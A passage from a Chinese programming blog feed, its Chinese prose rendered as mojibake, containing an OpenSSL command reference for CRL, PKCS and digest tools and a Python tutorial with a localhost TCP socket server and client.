æ‰“å°å‡ºä¸‹ä¸€æ¬¡æ›´æ–°çš„æ—¶é—´ã€‚ <br>        7.11) -CAfile file<br>        æŒ‡å®šCAæ–‡ä»¶ï¼Œç”¨æ¥éªŒè¯è¯¥CRLå¯¹è±¡æ˜¯å¦åˆæ³•ã€‚ <br>        7.12) -verify<br>        æ˜¯å¦éªŒè¯è¯ä¹¦ã€‚        <br>    example1: è¾“å‡ºCRLæ–‡ä»¶ï¼ŒåŒ…æ‹¬(é¢å‘è€…ä¿¡æ¯HASHå€¼ã€ä¸Šä¸€æ¬¡æ›´æ–°çš„æ—¶é—´ã€ä¸‹ä¸€æ¬¡æ›´æ–°çš„æ—¶é—´)<br>    openssl crl -in crl.crl -text -issuer -hash -lastupdate â€“nextupdate <br>    example2: å°†PEMæ ¼å¼çš„CRLæ–‡ä»¶è½¬æ¢ä¸ºDERæ ¼å¼<br>    openssl crl -in crl.pem -outform DER -out crl.der  <br><br>    8) crl2pkcs7: ç”¨äºCRLå’ŒPKCS#7ä¹‹é—´çš„è½¬æ¢ <br>    openssl crl2pkcs7 [options] &lt;infile &gt;outfile<br>    è½¬æ¢pemåˆ°spc<br>    openssl crl2pkcs7 -nocrl -certfile venus.pem -outform DER -out venus.spc<br>    https://www.openssl.org/docs/apps/crl2pkcs7.html<br><br>    9) pkcs12: PKCS#12æ•°æ®çš„ç®¡ç†<br>    pkcs12æ–‡ä»¶å·¥å…·ï¼Œèƒ½ç”Ÿæˆå’Œåˆ†æpkcs12æ–‡ä»¶ã€‚PKCS#12æ–‡ä»¶å¯ä»¥è¢«ç”¨äºå¤šä¸ªé¡¹ç›®ï¼Œä¾‹å¦‚åŒ…å«Netscapeã€ MSIE å’Œ MS Outlook<br>    openssl pkcs12 [options] <br>    http://blog.csdn.net/as3luyuan123/article/details/16105475<br>    https://www.openssl.org/docs/apps/pkcs12.html<br><br>    10) pkcs7: PCKS#7æ•°æ®çš„ç®¡ç† <br>    ç”¨äºå¤„ç†DERæˆ–è€…PEMæ ¼å¼çš„pkcs#7æ–‡ä»¶<br>    openssl pkcs7 [options] &lt;infile &gt;outfile<br>    http://blog.csdn.net/as3luyuan123/article/details/16105407<br>    https://www.openssl.org/docs/apps/pkcs7.html<br> <br>2. openssl list-message-digest-commands(æ¶ˆæ¯æ‘˜è¦å‘½ä»¤)<br>    1) dgst: dgstç”¨äºè®¡ç®—æ¶ˆæ¯æ‘˜è¦ <br>    openssl dgst [args]<br>        1.1) -hex           <br>        ä»¥16è¿›åˆ¶å½¢å¼è¾“å‡ºæ‘˜è¦<br>        1.2) -binary        <br>        ä»¥äºŒè¿›åˆ¶å½¢å¼è¾“å‡ºæ‘˜è¦<br>        1.3) -sign file    <br>        ä»¥ç§é’¥æ–‡ä»¶å¯¹ç”Ÿæˆçš„æ‘˜è¦è¿›è¡Œç­¾å<br>        1.4) -verify file    <br>        ä½¿ç”¨å…¬é’¥æ–‡ä»¶å¯¹ç§é’¥ç­¾åè¿‡çš„æ‘˜è¦æ–‡ä»¶è¿›è¡ŒéªŒè¯ <br>        1.5) -prverify file  <br>        ä»¥ç§é’¥æ–‡ä»¶å¯¹å…¬é’¥ç­¾åè¿‡çš„æ‘˜è¦æ–‡ä»¶è¿›è¡ŒéªŒè¯<br>        verify a signature using private key in file<br>        1.6) åŠ å¯†å¤„ç†<br>            1.6.1) -md5: MD5 <br>            1.6.2) -md4: MD4         <br>            1.6.3) -sha1: SHA1 <br>            1.6.4) -ripemd160<br>    example1: ç”¨SHA1ç®—æ³•è®¡ç®—æ–‡ä»¶file.txtçš„å“ˆè¥¿å€¼ï¼Œè¾“å‡ºåˆ°stdout<br>    openssl dgst -sha1 file.txt<br>    example2: ç”¨dss1ç®—æ³•éªŒè¯file.txtçš„æ•°å­—ç­¾ådsasign.binï¼ŒéªŒè¯çš„private keyä¸ºDSAç®—æ³•äº§ç”Ÿçš„æ–‡ä»¶dsakey.pem<br>    openssl dgst -dss1 -prverify dsakey.pem -signature dsasign.bin file.txt<br><br>    2) sha1: ç”¨äºè¿›è¡ŒRSAå¤„ç†<br>    openssl sha1 [args] <br>        2.1) -sign file<br>        ç”¨äºRSAç®—æ³•çš„ç§é’¥æ–‡ä»¶ <br>        2.2) -out file<br>        è¾“å‡ºæ–‡ä»¶çˆ±ä½ <br>        2.3) -hex   <br>        ä»¥16è¿›åˆ¶å½¢å¼è¾“å‡º<br>        2.4) -binary<br>        ä»¥äºŒè¿›åˆ¶å½¢å¼è¾“å‡º  <br>    example1: ç”¨SHA1ç®—æ³•è®¡ç®—æ–‡ä»¶file.txtçš„HASHå€¼,è¾“å‡ºåˆ°æ–‡ä»¶digest.txt<br>    openssl sha1 -out digest.txt file.txt<br>    example2: ç”¨sha1ç®—æ³•ä¸ºæ–‡ä»¶file.txtç­¾å,è¾“å‡ºåˆ°æ–‡ä»¶rsasign.binï¼Œç­¾åçš„private keyä¸ºRSAç®—æ³•äº§ç”Ÿçš„æ–‡ä»¶rsaprivate.pem<br>    openssl sha1 -sign rsaprivate.pem -out rsasign.bin file.txt<br><br>3. openssl list-cipher-commands (Cipherå‘½ä»¤çš„åˆ—è¡¨)<br>    1) aes-128-cbc<br>    2) aes-128-ecb<br>    3) aes-192-cbc<br>    4) aes-192-ecb<br>    5) aes-256-cbc<br>    6) aes-256-ecb<br>    7) base64<br>    8) bf<br>    9) bf-cbc<br>    10) bf-cfb<br>    11) bf-ecb<br>    12) bf-ofb<br>    13) cast<br>    14) cast-cbc<br>    15) cast5-cbc<br>    16) cast5-cfb<br>    17) cast5-ecb<br>    18) cast5-ofb<br>    19) des<br>    20) des-cbc<br>    21) des-cfb<br>    22) des-ecb<br>    23) des-ede<br>    24) des-ede-cbc<br>    25) des-ede-cfb<br>    26) des-ede-ofb<br>    27) des-ede3<br>    28) des-ede3-cbc<br>    29) des-ede3-cfb<br>    30) des-ede3-ofb<br>    31) des-ofb<br>    32) des3<br>    33) desx<br>    34) rc2<br>    35) rc2-40-cbc<br>    36) rc2-64-cbc<br>    37) rc2-cbc<br>    38) rc2-cfb<br>    39) rc2-ecb<br>    40) rc2-ofb<br>    41) rc4<br>    42) rc4-40<br></code></pre></div></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a class="markdownIt-Anchor" href="#å‚è€ƒé“¾æ¥"></a> å‚è€ƒé“¾æ¥</h2><p><a href="https://docs.python.org/zh-cn/3/library/ssl.html#module-ssl">python SSLå®˜æ–¹æ–‡æ¡£</a></p><p><a href="https://blog.csdn.net/gengxiaoming7/article/details/78505107">opensslè¯¦è§£</a></p><p><a href="https://blog.csdn.net/sinat_41901875/article/details/103600299">å…³äºSSLé€šä¿¡ä»¥åŠpythonçš„å®ç°</a></p><p><a href="https://www.feistyduck.com/library/openssl-cookbook/">ä¸€æœ¬opensslå®˜ç½‘æ¨èçš„opensslå‘½ä»¤å‚è€ƒä¹¦</a></p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œç¼–ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>ç½‘ç»œé€šä¿¡</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>socketç¼–ç¨‹pythonå®ç°</title>
    <link href="/posts/79900945/"/>
    <url>/posts/79900945/</url>
    
    <content type="html"><![CDATA[<h1 id="socketåŸºæœ¬æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#socketåŸºæœ¬æ¦‚å¿µ"></a> socketåŸºæœ¬æ¦‚å¿µ</h1><p>socketæ˜¯åŸºäºC/Sæ¶æ„çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿›è¡Œsocketç½‘ç»œç¼–ç¨‹ï¼Œé€šå¸¸éœ€è¦ç¼–å†™ä¸¤ä¸ªpyæ–‡ä»¶ï¼Œä¸€ä¸ªæœåŠ¡ç«¯ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯ã€‚</p><p>é¦–å…ˆï¼Œå¯¼å…¥Pythonä¸­çš„socketæ¨¡å—ï¼š import socket</p><p>Pythonä¸­çš„socketé€šä¿¡é€»è¾‘å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/posts/79900945/1762677-20201007160746044-1258982359.png" alt="image.png-58.5kB"></p><hr><p>åœ¨Pythonä¸­ï¼Œ<code>import socket</code>åï¼Œç”¨<code>socket.socket()</code>æ–¹æ³•æ¥åˆ›å»ºå¥—æ¥å­—ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">socket.socket(<span class="hljs-attribute">family</span>=AF_INET, <span class="hljs-attribute">type</span>=SOCK_STREAM, <span class="hljs-attribute">proto</span>=0, <span class="hljs-attribute">fileno</span>=None)<br></code></pre></div></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li>family: å¥—æ¥å­—å®¶æ—ï¼Œå¯ä»¥ä½¿<code>AF_UNIX</code>æˆ–è€…<code>AF_INET</code>ã€‚</li><li>type: å¥—æ¥å­—ç±»å‹ï¼Œæ ¹æ®æ˜¯é¢å‘è¿æ¥çš„è¿˜æ˜¯éè¿æ¥åˆ†ä¸º<code>SOCK_STREAM</code>æˆ–<code>SOCK_DGRAM</code>ï¼Œä¹Ÿå°±æ˜¯TCPå’ŒUDPçš„åŒºåˆ«ã€‚</li><li>protocol: ä¸€èˆ¬ä¸å¡«é»˜è®¤ä¸º0ã€‚</li></ul><p>ç›´æ¥socket.socket()ï¼Œåˆ™å…¨éƒ¨ä½¿ç”¨é»˜è®¤å€¼ã€‚</p><p>ä¸‹é¢æ˜¯å…·ä½“çš„å‚æ•°å®šä¹‰ï¼š</p><table><thead><tr><th>socketç±»å‹</th><th>æè¿°</th></tr></thead><tbody><tr><td>socket.AF_UNIX</td><td>åªèƒ½å¤Ÿç”¨äºå•ä¸€çš„Unixç³»ç»Ÿè¿›ç¨‹é—´é€šä¿¡</td></tr><tr><td>socket.AF_INET</td><td>IPv4</td></tr><tr><td>socket.AF_INET6</td><td>IPv6</td></tr><tr><td>socket.SOCK_STREAM</td><td>æµå¼socket , for TCP</td></tr><tr><td>socket.SOCK_DGRAM</td><td>æ•°æ®æŠ¥å¼socket , for UDP</td></tr><tr><td>socket.SOCK_RAW</td><td>åŸå§‹å¥—æ¥å­—ï¼Œæ™®é€šçš„å¥—æ¥å­—æ— æ³•å¤„ç†ICMPã€IGMPç­‰ç½‘ç»œæŠ¥æ–‡ï¼Œè€ŒSOCK_RAWå¯ä»¥ï¼›å…¶æ¬¡ï¼ŒSOCK_RAWä¹Ÿå¯ä»¥å¤„ç†ç‰¹æ®Šçš„IPv4æŠ¥æ–‡ï¼›æ­¤å¤–ï¼Œåˆ©ç”¨åŸå§‹å¥—æ¥å­—ï¼Œå¯ä»¥é€šè¿‡IP_HDRINCLå¥—æ¥å­—é€‰é¡¹ç”±ç”¨æˆ·æ„é€ IPå¤´ã€‚</td></tr><tr><td>socket.SOCK_SEQPACKET</td><td>å¯é çš„è¿ç»­æ•°æ®åŒ…æœåŠ¡</td></tr><tr><td>åˆ›å»ºTCP Socketï¼š</td><td>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</td></tr><tr><td>åˆ›å»ºUDP Socketï¼š</td><td>s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</td></tr></tbody></table><p>é€šè¿‡<code>s = socket.socket()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ä¸€ä¸ªsocketå¯¹è±¡sï¼Œä¹Ÿå°±æ˜¯é€šå¸¸è¯´çš„è·å–äº†ä¸€ä¸ªâ€œå¥—æ¥å­—â€ï¼Œè¯¥å¯¹è±¡å…·æœ‰ä¸€ä¸‹æ–¹æ³•ï¼š</p><table><thead><tr><th>æ–¹æ³•</th><th>æè¿°</th></tr></thead><tbody><tr><td><strong>æœåŠ¡å™¨ç«¯æ–¹æ³•</strong></td><td></td></tr><tr><td><strong>s.bind()</strong></td><td>ç»‘å®šåœ°å€ï¼ˆhost,portï¼‰åˆ°å¥—æ¥å­—ï¼Œåœ¨AF_INETä¸‹,ä»¥å…ƒç»„ï¼ˆhost,portï¼‰çš„å½¢å¼è¡¨ç¤ºåœ°å€ã€‚</td></tr><tr><td><strong>s.listen(backlog)</strong></td><td>å¼€å§‹ç›‘å¬ã€‚backlogæŒ‡å®šåœ¨æ‹’ç»è¿æ¥ä¹‹å‰ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥æŒ‚èµ·çš„æœ€å¤§è¿æ¥æ•°é‡ã€‚è¯¥å€¼è‡³å°‘ä¸º1ï¼Œå¤§éƒ¨åˆ†åº”ç”¨ç¨‹åºè®¾ä¸º5å°±å¯ä»¥äº†ã€‚</td></tr><tr><td><strong>s.accept()</strong></td><td>è¢«åŠ¨æ¥å—å®¢æˆ·ç«¯è¿æ¥,(é˜»å¡å¼)ç­‰å¾…è¿æ¥çš„åˆ°æ¥ï¼Œå¹¶è¿”å›ï¼ˆconn,addressï¼‰äºŒå…ƒå…ƒç»„,å…¶ä¸­connæ˜¯ä¸€ä¸ªé€šä¿¡å¯¹è±¡ï¼Œå¯ä»¥ç”¨æ¥æ¥æ”¶å’Œå‘é€æ•°æ®ã€‚addressæ˜¯è¿æ¥å®¢æˆ·ç«¯çš„åœ°å€ã€‚</td></tr><tr><td><strong>å®¢æˆ·ç«¯æ–¹æ³•</strong></td><td></td></tr><tr><td><strong>s.connect(address)</strong></td><td>å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·è¿æ¥ã€‚ä¸€èˆ¬addressçš„æ ¼å¼ä¸ºå…ƒç»„ï¼ˆhostname,portï¼‰ï¼Œå¦‚æœè¿æ¥å‡ºé”™ï¼Œè¿”å›socket.erroré”™è¯¯ã€‚</td></tr><tr><td>s.connect_ex()</td><td>connect()å‡½æ•°çš„æ‰©å±•ç‰ˆæœ¬,å‡ºé”™æ—¶è¿”å›å‡ºé”™ç ,è€Œä¸æ˜¯æŠ›å‡ºå¼‚å¸¸</td></tr><tr><td><strong>å…¬å…±æ–¹æ³•</strong></td><td></td></tr><tr><td><strong>s.recv(bufsize)</strong></td><td>æ¥æ”¶æ•°æ®ï¼Œæ•°æ®ä»¥bytesç±»å‹è¿”å›ï¼ŒbufsizeæŒ‡å®šè¦æ¥æ”¶çš„æœ€å¤§æ•°æ®é‡ã€‚</td></tr><tr><td><strong>s.send()</strong></td><td>å‘é€æ•°æ®ã€‚è¿”å›å€¼æ˜¯è¦å‘é€çš„å­—èŠ‚æ•°é‡ã€‚</td></tr><tr><td><strong>s.sendall()</strong></td><td>å®Œæ•´å‘é€æ•°æ®ã€‚å°†æ•°æ®å‘é€åˆ°è¿æ¥çš„å¥—æ¥å­—ï¼Œä½†åœ¨è¿”å›ä¹‹å‰ä¼šå°è¯•å‘é€æ‰€æœ‰æ•°æ®ã€‚æˆåŠŸè¿”å›Noneï¼Œå¤±è´¥åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</td></tr><tr><td>s.recvform()</td><td>æ¥æ”¶UDPæ•°æ®ï¼Œä¸recv()ç±»ä¼¼ï¼Œä½†è¿”å›å€¼æ˜¯ï¼ˆdata,addressï¼‰ã€‚å…¶ä¸­dataæ˜¯åŒ…å«æ¥æ”¶çš„æ•°æ®ï¼Œaddressæ˜¯å‘é€æ•°æ®çš„å¥—æ¥å­—åœ°å€ã€‚</td></tr><tr><td>s.sendto(data,address)</td><td>å‘é€UDPæ•°æ®ï¼Œå°†æ•°æ®dataå‘é€åˆ°å¥—æ¥å­—ï¼Œaddressæ˜¯å½¢å¼ä¸ºï¼ˆipaddrï¼Œportï¼‰çš„å…ƒç»„ï¼ŒæŒ‡å®šè¿œç¨‹åœ°å€ã€‚è¿”å›å€¼æ˜¯å‘é€çš„å­—èŠ‚æ•°ã€‚</td></tr><tr><td><strong>s.close()</strong></td><td>å…³é—­å¥—æ¥å­—ï¼Œå¿…é¡»æ‰§è¡Œã€‚</td></tr><tr><td>s.getpeername()</td><td>è¿”å›è¿æ¥å¥—æ¥å­—çš„è¿œç¨‹åœ°å€ã€‚è¿”å›å€¼é€šå¸¸æ˜¯å…ƒç»„ï¼ˆipaddr,portï¼‰ã€‚</td></tr><tr><td>s.getsockname()</td><td>è¿”å›å¥—æ¥å­—è‡ªå·±çš„åœ°å€ã€‚é€šå¸¸æ˜¯ä¸€ä¸ªå…ƒç»„(ipaddr,port)</td></tr><tr><td>s.setsockopt(level,optname,value)</td><td>è®¾ç½®ç»™å®šå¥—æ¥å­—é€‰é¡¹çš„å€¼ã€‚</td></tr><tr><td>s.getsockopt(level,optname[.buflen])</td><td>è¿”å›å¥—æ¥å­—é€‰é¡¹çš„å€¼ã€‚</td></tr><tr><td>s.settimeout(timeout)</td><td>è®¾ç½®å¥—æ¥å­—æ“ä½œçš„è¶…æ—¶æœŸï¼Œtimeoutæ˜¯ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œå•ä½æ˜¯ç§’ã€‚å€¼ä¸ºNoneè¡¨ç¤ºæ²¡æœ‰è¶…æ—¶æœŸã€‚ä¸€èˆ¬ï¼Œè¶…æ—¶æœŸåº”è¯¥åœ¨åˆšåˆ›å»ºå¥—æ¥å­—æ—¶è®¾ç½®ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ç”¨äºè¿æ¥çš„æ“ä½œï¼ˆå¦‚connect()ï¼‰</td></tr><tr><td>s.gettimeout()</td><td>è¿”å›å½“å‰è¶…æ—¶æœŸçš„å€¼ï¼Œå•ä½æ˜¯ç§’ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®è¶…æ—¶æœŸï¼Œåˆ™è¿”å›Noneã€‚</td></tr><tr><td>s.fileno()</td><td>è¿”å›å¥—æ¥å­—çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</td></tr><tr><td>s.setblocking(flag)</td><td>å¦‚æœflagä¸º0ï¼Œåˆ™å°†å¥—æ¥å­—è®¾ä¸ºéé˜»å¡æ¨¡å¼ï¼Œå¦åˆ™å°†å¥—æ¥å­—è®¾ä¸ºé˜»å¡æ¨¡å¼ï¼ˆé»˜è®¤å€¼ï¼‰ã€‚éé˜»å¡æ¨¡å¼ä¸‹ï¼Œå¦‚æœè°ƒç”¨recv()æ²¡æœ‰å‘ç°ä»»ä½•æ•°æ®ï¼Œæˆ–send()è°ƒç”¨æ— æ³•ç«‹å³å‘é€æ•°æ®ï¼Œé‚£ä¹ˆå°†å¼•èµ·socket.errorå¼‚å¸¸ã€‚</td></tr><tr><td>s.makefile()</td><td>åˆ›å»ºä¸€ä¸ªä¸è¯¥å¥—æ¥å­—ç›¸å…³è¿çš„æ–‡ä»¶</td></tr></tbody></table><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p><ol><li>Python3ä»¥åï¼Œsocketä¼ é€’çš„éƒ½æ˜¯<strong>bytesç±»å‹</strong>çš„æ•°æ®ï¼Œå­—ç¬¦ä¸²éœ€è¦å…ˆè½¬æ¢ä¸€ä¸‹ï¼Œ<code>string.encode()</code>å³å¯ï¼›å¦ä¸€ç«¯æ¥æ”¶åˆ°çš„bytesæ•°æ®æƒ³è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œåªè¦<code>bytes.decode()</code>ä¸€ä¸‹å°±å¯ä»¥ã€‚</li><li>åœ¨æ­£å¸¸é€šä¿¡æ—¶ï¼Œ<code>accept()</code>å’Œ<code>recv()</code>æ–¹æ³•éƒ½æ˜¯é˜»å¡çš„ã€‚æ‰€è°“çš„é˜»å¡ï¼ŒæŒ‡çš„æ˜¯ç¨‹åºä¼šæš‚åœåœ¨é‚£ï¼Œä¸€ç›´ç­‰åˆ°æœ‰æ•°æ®è¿‡æ¥ã€‚</li></ol><h1 id="socketç¼–ç¨‹æ€è·¯"><a class="markdownIt-Anchor" href="#socketç¼–ç¨‹æ€è·¯"></a> socketç¼–ç¨‹æ€è·¯</h1><p><strong>æœåŠ¡ç«¯ï¼š</strong></p><ol><li>åˆ›å»ºå¥—æ¥å­—ï¼Œç»‘å®šå¥—æ¥å­—åˆ°æœ¬åœ°IPä¸ç«¯å£ï¼šsocket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind()</li><li>å¼€å§‹ç›‘å¬è¿æ¥ï¼šs.listen()</li><li>è¿›å…¥å¾ªç¯ï¼Œä¸æ–­æ¥å—å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ï¼šs.accept()</li><li>æ¥æ”¶ä¼ æ¥çš„æ•°æ®ï¼Œæˆ–è€…å‘é€æ•°æ®ç»™å¯¹æ–¹ï¼šs.recv() , s.sendall()</li><li>ä¼ è¾“å®Œæ¯•åï¼Œå…³é—­å¥—æ¥å­—ï¼šs.close()</li></ol><p><strong>å®¢æˆ·ç«¯:</strong></p><ol><li>åˆ›å»ºå¥—æ¥å­—ï¼Œè¿æ¥æœåŠ¡å™¨åœ°å€ï¼šsocket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.connect()</li><li>è¿æ¥åå‘é€æ•°æ®å’Œæ¥æ”¶æ•°æ®ï¼šs.sendall(), s.recv()</li><li>ä¼ è¾“å®Œæ¯•åï¼Œå…³é—­å¥—æ¥å­—ï¼šs.close()</li></ol><p>Pythonçš„socketç¼–ç¨‹ï¼Œé€šå¸¸å¯åˆ†ä¸ºTCPå’ŒUDPç¼–ç¨‹ä¸¤ç§ï¼Œå‰è€…æ˜¯å¸¦è¿æ¥çš„å¯é ä¼ è¾“æœåŠ¡ï¼Œæ¯æ¬¡é€šä¿¡éƒ½è¦æ¡æ‰‹ï¼Œç»“æŸä¼ è¾“ä¹Ÿè¦æŒ¥æ‰‹ï¼Œæ•°æ®ä¼šè¢«æ£€éªŒï¼Œæ˜¯ä½¿ç”¨æœ€å¹¿çš„é€šç”¨æ¨¡å¼ï¼›åè€…æ˜¯ä¸å¸¦è¿æ¥çš„ä¼ è¾“æœåŠ¡ï¼Œç®€å•ç²—æš´ï¼Œä¸åŠ æ§åˆ¶å’Œæ£€æŸ¥çš„ä¸€è‚¡è„‘å°†æ•°æ®å‘é€å‡ºå»çš„æ–¹å¼ï¼Œä½†æ˜¯ä¼ è¾“é€Ÿåº¦å¿«ï¼Œé€šå¸¸ç”¨äºå®‰å…¨å’Œå¯é ç­‰çº§ä¸é«˜çš„ä¸šåŠ¡åœºæ™¯ï¼Œæ¯”å¦‚æ–‡ä»¶ä¸‹è½½ã€‚</p><h1 id="ç¼–ç¨‹å®ç°"><a class="markdownIt-Anchor" href="#ç¼–ç¨‹å®ç°"></a> ç¼–ç¨‹å®ç°</h1><h2 id="æœåŠ¡å™¨ç«¯"><a class="markdownIt-Anchor" href="#æœåŠ¡å™¨ç«¯"></a> <strong>æœåŠ¡å™¨ç«¯ï¼š</strong></h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><br>sk = socket.socket()            <span class="hljs-comment"># åˆ›å»ºå¥—æ¥å­—</span><br>sk.bind(ip_port)                <span class="hljs-comment"># ç»‘å®šæœåŠ¡åœ°å€</span><br>sk.listen(<span class="hljs-number">5</span>)                    <span class="hljs-comment"># ç›‘å¬è¿æ¥è¯·æ±‚</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å¯åŠ¨socketæœåŠ¡ï¼Œç­‰å¾…å®¢æˆ·ç«¯è¿æ¥...&#x27;</span>)<br>conn, address = sk.accept()     <span class="hljs-comment"># ç­‰å¾…è¿æ¥ï¼Œæ­¤å¤„è‡ªåŠ¨é˜»å¡</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># ä¸€ä¸ªæ­»å¾ªç¯ï¼Œç›´åˆ°å®¢æˆ·ç«¯å‘é€â€˜exitâ€™çš„ä¿¡å·ï¼Œæ‰å…³é—­è¿æ¥</span><br>    client_data = conn.recv(<span class="hljs-number">1024</span>).decode()      <span class="hljs-comment"># æ¥æ”¶ä¿¡æ¯</span><br>    <span class="hljs-keyword">if</span> client_data == <span class="hljs-string">&quot;exit&quot;</span>:       <span class="hljs-comment"># åˆ¤æ–­æ˜¯å¦é€€å‡ºè¿æ¥</span><br>        sk.close()  <span class="hljs-comment"># å…³é—­è¿æ¥</span><br>        exit(<span class="hljs-string">&quot;é€šä¿¡ç»“æŸ&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ¥è‡ª%sçš„å®¢æˆ·ç«¯å‘ä½ å‘æ¥ä¿¡æ¯ï¼š%s&quot;</span> % (address, client_data))<br>    conn.sendall(<span class="hljs-string">&#x27;æœåŠ¡å™¨å·²ç»æ”¶åˆ°ä½ çš„ä¿¡æ¯&#x27;</span>.encode())    <span class="hljs-comment"># å›é¦ˆä¿¡æ¯ç»™å®¢æˆ·ç«¯</span><br></code></pre></div></td></tr></table></figure><h2 id="å®¢æˆ·ç«¯"><a class="markdownIt-Anchor" href="#å®¢æˆ·ç«¯"></a> <strong>å®¢æˆ·ç«¯ï¼š</strong></h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><br>s = socket.socket()     <span class="hljs-comment"># åˆ›å»ºå¥—æ¥å­—</span><br><br>s.connect(ip_port)      <span class="hljs-comment"># è¿æ¥æœåŠ¡å™¨</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># é€šè¿‡ä¸€ä¸ªæ­»å¾ªç¯ä¸æ–­æ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å‘é€ç»™æœåŠ¡å™¨</span><br>    inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦å‘é€çš„ä¿¡æ¯ï¼š &quot;</span>).strip()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inp:     <span class="hljs-comment"># é˜²æ­¢è¾“å…¥ç©ºä¿¡æ¯ï¼Œå¯¼è‡´å¼‚å¸¸é€€å‡º</span><br>        <span class="hljs-keyword">continue</span><br>    s.sendall(inp.encode())<br><br>    <span class="hljs-keyword">if</span> inp == <span class="hljs-string">&quot;exit&quot;</span>:   <span class="hljs-comment"># å¦‚æœè¾“å…¥çš„æ˜¯â€˜exitâ€™ï¼Œè¡¨ç¤ºæ–­å¼€è¿æ¥</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç»“æŸé€šä¿¡ï¼&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br>    server_reply = s.recv(<span class="hljs-number">1024</span>).decode()<br>    <span class="hljs-built_in">print</span>(server_reply)<br><br>s.close()       <span class="hljs-comment"># å…³é—­è¿æ¥</span><br></code></pre></div></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼ŒåŸºæœ¬èƒ½å¤Ÿå±•ç¤ºå‡ºsocketé€šä¿¡çš„æœºåˆ¶ã€‚å¥—æ¥å­—çš„åˆ›å»ºå’Œå…³é—­ï¼ŒæœåŠ¡å™¨çš„ç»‘å®šå’Œç›‘å¬ï¼Œå®¢æˆ·ç«¯çš„è¿æ¥ï¼Œè¿™äº›éƒ½æ˜¯å›ºå®šå¥—è·¯ï¼Œæ²¡ä»€ä¹ˆéš¾ç‚¹ã€‚å…³é”®ä¹‹å¤„åœ¨äºå¾ªç¯å†…éƒ¨çš„æ”¶å‘é€»è¾‘ï¼Œè¿™é‡Œæ‰æ˜¯é‡ç‚¹ï¼Œéœ€è¦æ ¹æ®ä½ è‡ªå·±çš„ä¸šåŠ¡éœ€æ±‚ï¼Œæ­£ç¡®ç¼–å†™ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸€å®šè¦æ³¨æ„ï¼Œæ”¶å‘æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œæœ‰å‘å°±è¦æœ‰æ”¶ï¼Œå¹¶ä¸”recv()æ–¹æ³•é»˜è®¤æ˜¯é˜»å¡çš„ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.liujiangblog.com/course/python/76">https://www.liujiangblog.com/course/python/76</a></p><p><a href="https://docs.python.org/zh-cn/3/library/socket.html">socket pythonå®˜æ–¹æ–‡æ¡£</a></p>]]></content>
